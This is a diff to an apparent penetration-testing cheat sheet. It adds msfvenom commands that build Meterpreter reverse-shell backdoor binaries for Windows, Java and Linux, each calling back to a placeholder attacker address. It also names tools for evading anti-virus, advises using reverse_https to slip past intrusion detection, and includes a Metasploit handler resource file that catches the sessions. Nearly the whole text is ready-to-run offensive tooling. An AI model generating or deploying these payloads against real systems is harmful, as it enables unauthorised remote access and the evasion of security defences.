@@ -1,4 +1,32 @@
 #Generating windows simple binary backdoors
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=SERVER_IPADDRESS LPORT=4444 -f exe > bin.exe
 
-#Evating anti-virus w/ shelter (https://www.shellterproject.com/)
+#Generating simple java binary
+msfvenom -p java/meterpreter/reverse_tcp LHOST=SERVER_IPADDRESS LPORT=4444 -f raw -o /tmp/java.jar
+
+#Generating simple linux binary
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=SERVER_IPADDRESS LPORT=4444 -f elf > /tmp/shell.elf
+
+#Evading anti-virus on windows 
+https://www.shellterproject.com/ (Windows Binary)
+https://github.com/trustedsec/unicorn (Powershell shellcode injection)
+
+#Evading IPS/IDS systems - use reverse_https payload, as deep packet inspection can't occur over SSL in most cases
+msfvenom -p windows/meterpreter/reverse_https LHOST=SERVER_IPADDRESS LPORT=443 -f exe > bin.exe
+
+#Loading resource when calling msfconsole
+msfconole -r /pathtofile/file.rc
+
+#Loading resource files when in msfconsole
+msf> resource /pathtofile/file.rc
+
+#Example resource file
+use multi/handler
+set payload java/meterpreter/reverse_tcp
+set LHOST SERVER_IPADDRESS 
+set LPORT 4444
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j
+
+
